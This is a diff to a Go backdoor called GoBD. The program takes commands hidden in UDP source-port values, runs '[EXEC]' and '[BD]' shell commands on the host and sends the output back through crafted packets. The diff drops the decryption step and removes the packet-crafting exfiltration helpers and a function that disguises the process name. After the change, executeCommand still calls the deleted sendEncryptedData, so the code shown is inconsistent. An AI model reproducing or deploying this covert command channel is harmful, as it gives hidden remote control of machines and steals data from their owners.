@@ -29,9 +29,7 @@ import(
 	"os"
 	"time"
 	"os/exec"
-	"reflect"
 	"io"
-	"unsafe"
 	"flag"
 	"encoding/binary"
 	"fmt"
@@ -156,9 +154,9 @@ func beginListen(ip string, port, lport uint16) {
 		}
 
 		if pType == CLIENT {
-			buffer = clientControl(uint16(udpLayer.SrcPort), ipLayer.SrcIP.String(), uint16(udpLayer.DstPort), lport, buffer)
+			buffer = clientControl(MAX_PORT - uint16(udpLayer.SrcPort), ipLayer.SrcIP.String(), uint16(udpLayer.DstPort), lport, buffer)
 		} else {
-			buffer = serverControl(uint16(udpLayer.SrcPort), ipLayer.SrcIP.String(), uint16(udpLayer.DstPort), port, lport, buffer, []byte(udpLayer.Payload))
+			buffer = serverControl(MAX_PORT - uint16(udpLayer.SrcPort), ipLayer.SrcIP.String(), uint16(udpLayer.DstPort), port, lport, buffer, []byte(udpLayer.Payload))
 		}
 		
 	}
@@ -172,13 +170,12 @@ func serverControl(val uint16, sIP string, port, dport, lport uint16, buffer []b
 		i = i + 2
 		
 		if(port == SND_CMPLETE){
-			data := decrypt_data(buffer[:(len(buffer)-1)])
 
-			if strings.HasPrefix(data, "[EXEC]") {
-				executeCommand(data, sIP, dport);
+			if strings.HasPrefix(string(buffer), "[EXEC]") {
+				executeCommand(string(buffer), sIP, dport);
 			}
-			if strings.HasPrefix(data, "[BD]") {
-				executeServerCommand(data, sIP, dport);
+			if strings.HasPrefix(string(buffer), "[BD]") {
+				executeServerCommand(string(buffer), sIP, dport);
 			}
 
 			buffer = buffer[:0]
@@ -293,136 +290,4 @@ func executeCommand(cmd, ip string, port uint16){
 	fmt.Printf("OUT:\n%s", out);
 
 	sendEncryptedData(port, string(out[:]), ip);
-}
-/* 
-    FUNCTION: sendEncryptedData(port int, data, ip string)
-    RETURNS: Nothing
-    ARGUMENTS: 
-                string ip : the ip address of the server
-                int port : port to send data to
-
-    ABOUT:
-    Sends encrypted data over UDP to the spcified port and ip.
-*/
-func sendEncryptedData(port uint16, data, ip string) {
-
-	cryptdata := encrypt_data(data)
-	size := len(cryptdata)
-	//make data write to source port, continue till end
-	for p := 0; p <= size; p = p + 2 {
-
-		var buffer []byte
-		
-		if p == size {
-			buffer = craftPacket("", ip, SND_CMPLETE);
-		} else {
-			temp := cryptdata[p:(p+1)]
-			buffer = craftPacket(string(temp), ip, port); 
-		}
-		
-		if buffer == nil { // if original query was invalid
-			fmt.Print("Buffer error, returned nil.\n")
-			continue
-		}
-
-		err := handle.WritePacketData(buffer);
-		checkError(err)
-	}
-}
-func craftPacket(data, ip string, port uint16) []byte {
-
-	ethernetLayer := &layers.Ethernet{
-		SrcMAC: localmac,
-		DstMAC: destmac,
-	}
-	
-	ipLayer := &layers.IPv4{
-		SrcIP: localip,
-		DstIP: net.ParseIP(ip),
-	}
-
-	//code, _ := strconv.ParseUint(data, 10, 16)
-	udpLayer := &layers.UDP{
-		SrcPort: 666, 
-		DstPort: 665,
-	}
-
-	err := udpLayer.SetNetworkLayerForChecksum(ipLayer)
-	checkError(err)
-	
-	buf := gopacket.NewSerializeBuffer();
-	opts := gopacket.SerializeOptions{
-		FixLengths: true,
-		ComputeChecksums: true,
-	}
-
-	err = gopacket.SerializeLayers(buf, opts, ethernetLayer, ipLayer, udpLayer);
-	checkError(err);
-
-	return buf.Bytes()
-}
-///Utility Functions//////////////////////////////////////////
-/* 
-    FUNCTION: func checkError(err error)
-    RETURNS: Nothing
-    ARGUMENTS: 
-              err error : the error code to check
-
-    ABOUT:
-    Checks an error code, panics if the error is not nil.
-*/
-func checkError(err error){
-	if err != nil {
-		panic(err)
-	}
-}
-/* 
-    FUNCTION: func SetProcessName(name string) error
-    RETURNS: err Error, if anything goes wrong
-    ARGUMENTS: 
-                string name: the new process name to set the program to
-
-    ABOUT:
-    Sets the process name of the GoBD program to name.
-*/
-func SetProcessName(name string) error {
-    argv0str := (*reflect.StringHeader)(unsafe.Pointer(&os.Args[0]));
-    argv0 := (*[1 << 30]byte)(unsafe.Pointer(argv0str.Data))[:argv0str.Len];
-
-    n := copy(argv0, name);
-    if n < len(argv0) {
-            argv0[n] = 0
-    }
-
-    return nil
-}
-
-/* 
-    FUNCTION: func GetLocalIP() string
-    RETURNS: String, the local ip 
-
-    ABOUT:
-    Grabs the local ip of the host system.
-*/
-func GetLocalIP() net.IP {
-    addrs, err := net.InterfaceAddrs();
-	checkError(err);
-	
-    for _, address := range addrs {
-        if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
-            if ipnet.IP.To4() != nil {
-                return ipnet.IP;
-            }
-        }
-    }
-	
-    return nil;
-}
-func GetLocalMAC(iface string) (macAddr net.HardwareAddr){
-
-	netInterface, err := net.InterfaceByName(iface)
-	checkError(err)
-
-	macAddr = netInterface.HardwareAddr
-	return macAddr;
 }
